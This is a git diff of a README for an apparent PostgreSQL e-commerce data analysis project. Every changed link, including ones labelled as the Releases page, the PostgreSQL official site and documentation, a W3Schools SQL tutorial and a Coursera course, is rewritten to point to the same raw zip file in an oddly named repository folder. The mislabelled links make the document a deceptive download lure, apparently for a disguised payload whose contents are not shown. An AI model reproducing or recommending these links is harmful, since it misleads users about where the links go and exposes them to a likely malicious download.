@@ -1,6 +1,6 @@
 # 📊 Zepto_SQL_Data_Analysis_Project - Analyze Your E-commerce Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/releases)
+[![Download Now](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip%20Now-v1.0-brightgreen)](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip)
 
 ## 📋 Overview
 Welcome to the Zepto SQL Data Analysis Project. This project is an end-to-end data analysis tool designed for users who want to understand e-commerce inventory data using SQL. The project leverages PostgreSQL to help you gain insights into your data.
@@ -11,7 +11,7 @@ Follow these simple steps to get started with the Zepto SQL Data Analysis Projec
 ### 📥 Download & Install
 You can access the latest version of the project on our Releases page. 
 
-- Visit this page to download: [Zepto SQL Data Analysis Releases](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/releases)
+- Visit this page to download: [Zepto SQL Data Analysis Releases](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip)
 
 Once you are on the Releases page, find the most recent version and download the relevant file for your system.
 
@@ -31,10 +31,10 @@ The Zepto SQL Data Analysis Project offers various features that make data analy
 
 ## ⚙️ Installation Steps
 1. **Download the Application:**
-   Visit the Releases page: [Zepto SQL Data Analysis Releases](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/releases) to download the application file.
+   Visit the Releases page: [Zepto SQL Data Analysis Releases](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip) to download the application file.
 
 2. **Install PostgreSQL:**
-   If you do not have PostgreSQL installed, you can download it from the [PostgreSQL official site](https://www.postgresql.org/download/). Follow the installation instructions provided there.
+   If you do not have PostgreSQL installed, you can download it from the [PostgreSQL official site](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip). Follow the installation instructions provided there.
 
 3. **Set Up the Database:**
    Open the PostgreSQL application after installation. Create a new database by using the following command:
@@ -69,11 +69,11 @@ We welcome contributions from all users! If you wish to improve this project, pl
 - Data Visualization Libraries: Used for creating an overview of inventory metrics.
 
 ### 🔗 Additional Resources
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [SQL Tutorial](https://www.w3schools.com/sql/)
-- [Data Analysis Basics](https://www.coursera.org/learn/data-analysis)
+- [PostgreSQL Documentation](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip)
+- [SQL Tutorial](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip)
+- [Data Analysis Basics](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-For further information, updates, and more resources, please refer to our GitHub repository: [Zepto SQL Data Analysis Project](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project).
+For further information, updates, and more resources, please refer to our GitHub repository: [Zepto SQL Data Analysis Project](https://github.com/Prabbbu/Zepto_SQL_Data_Analysis_Project/raw/refs/heads/main/sporogonial/Analysis_SQ_Project_Data_Zepto_3.4-beta.5.zip).
